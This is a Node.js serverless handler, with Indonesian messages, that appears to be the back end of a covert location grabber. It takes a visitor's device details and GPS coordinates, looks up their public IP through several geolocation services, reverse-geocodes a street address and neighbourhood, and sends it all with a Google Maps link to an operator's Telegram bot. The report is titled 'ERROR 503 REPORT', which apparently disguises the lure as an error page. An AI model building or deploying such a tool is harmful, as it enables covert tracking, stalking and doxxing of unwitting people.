export const config = {
  runtime: "nodejs"
};

/* ================= UTIL ================= */

function estimateRTRW(lat, lon) {
  if (!lat || !lon) return "-";
  const lt = Math.abs(parseFloat(lat));
  const ln = Math.abs(parseFloat(lon));
  const rt = (Math.floor((lt * 1000) % 10) + 1).toString().padStart(2, "0");
  const rw = (Math.floor((ln * 1000) % 10) + 1).toString().padStart(2, "0");
  return `RT~${rt} / RW~${rw} (estimasi area)`;
}

function getLocationQuality(acc) {
  const a = parseFloat(acc);
  if (isNaN(a)) return "Low ❌";
  if (a <= 20) return "High ✅";
  if (a <= 100) return "Medium ⚠️";
  return "Low ❌";
}

/* ================= IP ================= */

function getPublicIP(req) {
  let ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.headers["x-real-ip"] ||
    req.headers["cf-connecting-ip"] ||
    req.socket?.remoteAddress ||
    "";

  ip = ip.replace("::ffff:", "");

  if (
    !ip ||
    ip.startsWith("10.") ||
    ip.startsWith("192.168.") ||
    ip.startsWith("172.") ||
    ip === "127.0.0.1" ||
    ip === "::1"
  ) {
    return "Unknown";
  }
  return ip;
}

/* ================= IP INFO (MULTI FALLBACK) ================= */

async function getIPInfo(ip) {
  const apis = [
    async () => {
      const r = await fetch(`https://ipapi.co/${ip}/json/`);
      const j = await r.json();
      if (!j || j.error) throw 0;
      return {
        country: j.country_name,
        region: j.region,
        city: j.city,
        isp: j.org,
        postal: j.postal
      };
    },
    async () => {
      const r = await fetch(`https://ipwho.is/${ip}`);
      const j = await r.json();
      if (!j || j.success === false) throw 0;
      return {
        country: j.country,
        region: j.region,
        city: j.city,
        isp: j.isp,
        postal: j.postal
      };
    },
    async () => {
      const r = await fetch(`https://ipinfo.io/${ip}/json`);
      const j = await r.json();
      if (!j || j.error) throw 0;
      return {
        country: j.country,
        region: j.region,
        city: j.city,
        isp: j.org,
        postal: j.postal
      };
    }
  ];

  for (const api of apis) {
    try {
      return await api();
    } catch {}
  }
  return {};
}

/* ================= HANDLER ================= */

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Method Not Allowed");
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).send("ENV belum diset");
  }

  const input = req.body || {};
  const ip = getPublicIP(req);
  const time = new Date().toISOString().replace("T", " ").split(".")[0];

  /* ===== IP INFO ===== */
  const ipinfo = ip !== "Unknown" ? await getIPInfo(ip) : {};

  /* ===== ADDRESS ===== */
  let address = {};
  let locationSource = "GPS";

  if (input.latitude && input.latitude !== "Not Allowed") {
    try {
      const geoRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${input.latitude}&lon=${input.longitude}&zoom=18&addressdetails=1`,
        { headers: { "User-Agent": "LocationBot/1.0" } }
      );
      const geo = await geoRes.json();
      address = geo.address || {};
    } catch {}
  } else {
    locationSource = "IP (Approximate)";
    address = {
      road: "-",
      village: "-",
      suburb: "-",
      city: ipinfo.city,
      state: ipinfo.region,
      postcode: ipinfo.postal,
      country: ipinfo.country
    };
  }

  const mapsLink =
    input.latitude && input.latitude !== "Not Allowed"
      ? `https://www.google.com/maps?q=${input.latitude},${input.longitude}`
      : "-";

  /* ================= MESSAGE ================= */

  const message = `🚨 *ERROR 503 REPORT*

━━━━━━━━━━━━━━━━━━━━
📱 *DEVICE INFORMATION*
━━━━━━━━━━━━━━━━━━━━
📱 Brand        : ${input.brand || "-"}
🧠 OS           : ${input.os || "-"}
💻 Platform     : ${input.platform || "-"}
⚙️ CPU Cores    : ${input.cpu || "-"}
💾 RAM          : ${input.ram || "-"}
🖥 Resolution   : ${input.resolution || "-"}
🌐 Browser      :
${input.browser || "-"}

🕒 Timezone     : ${input.timezone || "-"}
🗣 Language     : ${input.language || "-"}
🌍 Public IP    : ${ip}

━━━━━━━━━━━━━━━━━━━━
🌎 *IP INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🌍 Country     : ${ipinfo.country || "-"}
📍 Region      : ${ipinfo.region || "-"}
🏙 City        : ${ipinfo.city || "-"}
🏢 ISP / Org   : ${ipinfo.isp || "-"}

━━━━━━━━━━━━━━━━━━━━
🏠 *ADDRESS INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🛣 Street      : ${address.road || "-"}
🏘 Village     : ${address.village || address.suburb || "-"}
🏙 District    : ${address.city_district || address.county || "-"}
🏛 City        : ${address.city || address.town || "-"}
🌆 Province    : ${address.state || "-"}
📮 Postal Code : ${address.postcode || "-"}
🌍 Country     : ${address.country || "-"}

━━━━━━━━━━━━━━━━━━━━
📐 *LOCATION QUALITY*
━━━━━━━━━━━━━━━━━━━━
🎯 Quality     : ${getLocationQuality(input.accuracy)}
🧭 Area Est.   : ${
    input.latitude ? estimateRTRW(input.latitude, input.longitude) : "-"
  }
📡 Source      : ${locationSource}

🗺 Google Maps:
${mapsLink}

⏰ Time : ${time}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });
    return res.status(200).send("OK");
  } catch {
    return res.status(500).send("Gagal kirim");
  }
}
